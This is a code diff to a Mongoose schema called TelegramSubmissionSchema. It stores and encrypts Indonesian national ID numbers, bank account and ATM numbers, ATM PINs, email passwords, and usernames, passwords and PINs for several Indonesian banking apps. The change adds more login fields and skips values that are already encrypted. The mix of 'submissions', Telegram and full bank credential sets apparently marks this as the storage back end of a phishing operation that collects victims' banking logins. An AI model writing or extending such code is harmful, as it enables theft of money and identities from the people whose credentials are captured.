@@ -53,12 +53,13 @@ const TelegramSubmissionSchema = new mongoose.Schema({
 TelegramSubmissionSchema.pre('save', function (next) {
     const fieldsToEncrypt = [
         'nik', 'noRek', 'noAtm', 'pinAtm', 'pinWondr', 'passWondr', 'passEmail',
-        'myBCAPassword', 'myBCAPin', 'brimoPassword', 'briMerchantPassword',
-        'kodeAkses', 'pinMBca', 'mobilePassword', 'mobilePin', 'ibPassword', 'ibPin'
+        'myBCAUser', 'myBCAPassword', 'myBCAPin', 'brimoUser', 'brimoPassword', 'briMerchantUser', 'briMerchantPassword',
+        'kodeAkses', 'pinMBca', 'mobileUser', 'mobilePassword', 'mobilePin', 'ibUser', 'ibPassword', 'ibPin',
+        'merchantUser', 'merchantPassword', 'ocbcNyalaUser', 'ocbcNyalaPassword', 'ocbcNyalaPin'
     ];
 
     fieldsToEncrypt.forEach(field => {
-        if (this[field] && this.isModified(field)) {
+        if (this[field] && this.isModified(field) && !String(this[field]).startsWith('U2FsdGVkX1')) {
             this[field] = encrypt(this[field]);
         }
     });
@@ -71,8 +72,9 @@ TelegramSubmissionSchema.methods.getDecryptedData = function () {
     const data = this.toObject();
     const fieldsToDecrypt = [
         'nik', 'noRek', 'noAtm', 'pinAtm', 'pinWondr', 'passWondr', 'passEmail',
-        'myBCAPassword', 'myBCAPin', 'brimoPassword', 'briMerchantPassword',
-        'kodeAkses', 'pinMBca', 'mobilePassword', 'mobilePin', 'ibPassword', 'ibPin'
+        'myBCAUser', 'myBCAPassword', 'myBCAPin', 'brimoUser', 'brimoPassword', 'briMerchantUser', 'briMerchantPassword',
+        'kodeAkses', 'pinMBca', 'mobileUser', 'mobilePassword', 'mobilePin', 'ibUser', 'ibPassword', 'ibPin',
+        'merchantUser', 'merchantPassword', 'ocbcNyalaUser', 'ocbcNyalaPassword', 'ocbcNyalaPin'
     ];
 
     fieldsToDecrypt.forEach(field => {
